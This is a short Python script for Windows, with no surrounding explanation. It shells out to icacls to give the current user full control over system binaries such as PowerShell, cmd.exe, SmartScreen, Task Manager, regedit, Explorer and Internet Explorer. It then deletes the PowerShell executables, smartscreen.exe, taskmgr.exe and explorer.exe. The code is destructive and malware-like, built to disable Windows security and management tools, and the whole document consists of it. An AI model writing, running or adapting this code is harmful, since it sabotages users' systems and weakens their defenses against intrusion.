#!/usr/bin/python
#coding:utf-8
import os, sys, time

# Get the current username
usr = os.environ["USERNAME"]

# Function to get full permission on powershell process windows
def icc_powershell():
    procs = ['powershell.exe', 'powershell_ise.exe']
    for proc in procs:
        ica = "\\windows\\system32\\icacls.exe \\Windows\\System32\\WindowsPowerShell\\v1.0\\%s /grant %s:F " %(proc, usr)
        os.system(ica)
# Function to get full permission on main process windows
def icc_sys32():
    procs = ['cmd.exe', 'smartscreen.exe', 'taskmgr.exe']
    for proc in procs:
        ica = "\\windows\\system32\\icacls.exe \\Windows\\System32\\%s /grant %s:F " %(proc, usr)
        os.system(ica)
# Function to get full permission on iexplore process
def icc_iexdir():
    iex = ['\\Program Files (x86)\\Internet Explorer\\*', '\\Program Files\\Internet Explorer\\*']
    for dir in iex:
        ica = '\\windows\\system32\\icacls.exe "%s" /grant %s:F ' %(dir, usr)
        os.system(ica)
# Function to get full permission on Register and Explorer of Windows
def icc_regexp():
    procs = ['regedit.exe', 'explorer.exe']
    for proc in procs:
        ica = "\\Windows\\system32\\icacls.exe \\Windows\\%s /grant %s:F " %(proc, usr)
        os.system(ica)
# Function to delete process in the directory specified
def remove_proc():
    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
    for proc in pwr_sh:
        cmd = "del \\windows\\system32\\WindowsPowerShell\\v1.0\\%s " %(proc)
        os.system(cmd)
    procs = ['smartscreen.exe', 'taskmgr.exe']
    for proc in procs:
        cmd = "del \\windows\\system32\\%s " %(proc)
        os.system(cmd)
    gui = ['explorer.exe']
    for proc in gui:
        cmd = "del \\windows\\%s " %(proc)
        os.system(cmd)
